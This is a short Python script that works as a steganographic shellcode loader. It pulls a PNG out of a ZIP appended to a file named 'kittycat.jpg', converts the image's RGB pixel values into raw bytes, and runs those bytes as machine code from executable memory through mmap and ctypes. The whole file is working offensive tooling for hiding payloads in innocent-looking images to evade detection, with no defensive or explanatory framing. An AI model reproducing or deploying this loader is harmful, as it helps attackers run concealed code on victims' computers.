#!/usr/bin/env python3
import io
import mmap
import ctypes
import zipfile
from pathlib import Path

from PIL import Image


def load_png_from_embedded_zip(container_path: Path, png_name: str = "beautiful_sunset.png") -> bytes:
    data = container_path.read_bytes()
    off = data.find(b"PK\x03\x04")
    if off == -1:
        raise RuntimeError("Embedded ZIP signature not found")

    with zipfile.ZipFile(io.BytesIO(data[off:])) as zf:
        try:
            return zf.read(png_name)
        except KeyError as exc:
            raise RuntimeError(f"{png_name} not found in embedded ZIP") from exc


def png_rgb_to_shellcode(png_bytes: bytes) -> bytes:
    with Image.open(io.BytesIO(png_bytes)) as img:
        rgb = img.convert("RGB")
        pixels = list(rgb.getdata())

    sc = bytearray()
    for r, g, b in pixels:
        sc.extend((r, g, b))
    return bytes(sc)


def run_shellcode(code: bytes) -> None:
    mem = mmap.mmap(-1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mem.write(code)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
    func = ctypes.CFUNCTYPE(None)(addr)
    func()


def main() -> None:
    container = Path("kittycat.jpg")
    if not container.exists():
        raise RuntimeError("kittycat.jpg not found in current directory")

    png_bytes = load_png_from_embedded_zip(container)
    shellcode = png_rgb_to_shellcode(png_bytes)
    run_shellcode(shellcode)


if __name__ == "__main__":
    main()
